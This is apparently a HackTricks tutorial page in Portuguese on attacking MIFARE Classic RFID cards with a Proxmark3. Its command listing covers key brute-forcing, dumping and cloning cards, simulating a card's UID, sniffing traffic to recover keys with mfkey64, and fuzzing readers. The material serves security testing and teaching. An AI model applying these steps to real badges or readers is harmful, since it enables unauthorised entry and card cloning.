# Proxmark 3

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Atacando Sistemas RFID com Proxmark3

A primeira coisa que você precisa fazer é ter um [**Proxmark3**](https://proxmark.com) e [**instalar o software e suas dependências**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Atacando MIFARE Classic 1KB

Possui **16 setores**, cada um com **4 blocos** e cada bloco contém **16B**. O UID está no setor 0 bloco 0 (e não pode ser alterado).\
Para acessar cada setor, você precisa de **2 chaves** (**A** e **B**) que são armazenadas no **bloco 3 de cada setor** (trailer do setor). O trailer do setor também armazena os **bits de acesso** que concedem permissões de **leitura e escrita** em **cada bloco** usando as 2 chaves.\
2 chaves são úteis para dar permissões de leitura se você souber a primeira e de escrita se souber a segunda (por exemplo).

Vários ataques podem ser realizados
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
O Proxmark3 permite realizar outras ações como **interceptar** a **comunicação entre o Tag e o Leitor** para tentar encontrar dados sensíveis. Neste cartão, você pode simplesmente interceptar a comunicação e calcular a chave usada porque as **operações criptográficas utilizadas são fracas** e, conhecendo o texto simples e cifrado, você pode calculá-la (ferramenta `mfkey64`).

### Comandos Raw

Os sistemas IoT às vezes usam **tags não marcadas ou não comerciais**. Nesse caso, você pode usar o Proxmark3 para enviar **comandos raw personalizados para as tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Com essa informação, você pode tentar buscar informações sobre o cartão e sobre a forma de se comunicar com ele. O Proxmark3 permite enviar comandos brutos como: `hf 14a raw -p -b 7 26`

### Scripts

O software Proxmark3 vem com uma lista pré-carregada de **scripts de automação** que você pode usar para realizar tarefas simples. Para recuperar a lista completa, use o comando `script list`. Em seguida, use o comando `script run`, seguido pelo nome do script:
```
proxmark3> script run mfkeys
```
Podes criar um script para **fuzzar leitores de tags**, copiando os dados de um **cartão válido** e escrevendo um **script Lua** que **randomize** um ou mais **bytes aleatórios** e verifique se o **leitor crasha** com qualquer iteração.

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}


<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Trabalhas numa **empresa de cibersegurança**? Queres ver a **tua empresa anunciada no HackTricks**? ou queres ter acesso à **última versão do PEASS ou fazer download do HackTricks em PDF**? Verifica os [**PLANOS DE SUBSCRIÇÃO**](https://github.com/sponsors/carlospolop)!
* Descobre [**A Família PEASS**](https://opensea.io/collection/the-peass-family), a nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtém o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Junta-te ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **segue-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partilha os teus truques de hacking submetendo PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
